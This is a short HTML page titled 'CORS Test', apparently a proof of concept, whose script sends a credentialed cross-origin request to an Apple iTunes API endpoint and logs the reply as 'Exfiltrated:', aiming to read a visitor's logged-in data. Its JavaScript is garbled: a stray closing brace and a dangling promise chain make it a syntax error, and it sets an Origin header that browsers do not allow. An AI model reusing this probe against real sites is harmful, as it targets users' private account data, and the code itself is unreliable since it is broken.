<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Test</title>
</head>
<body>
    <h1>CORS Test</h1>
    <p>Check console in DevTools.</p>

    <script>
        fetch("https://uclient-api.itunes.apple.com/WebObjects/MZStorePlatform.woa/wa/lookup", {
            method: "GET",
            headers: {
                "Origin": "https://bolich12.github.io/cors-test"
            },
            credentials: "include"
       })
    .then(res => res.json())
    .then(data => {
        console.log("Exfiltrated:", data);
    });
        .then(data => console.log("Response data:", data))
        .catch(error => console.error("Error occurred:", error));
    </script>
</body>
</html>
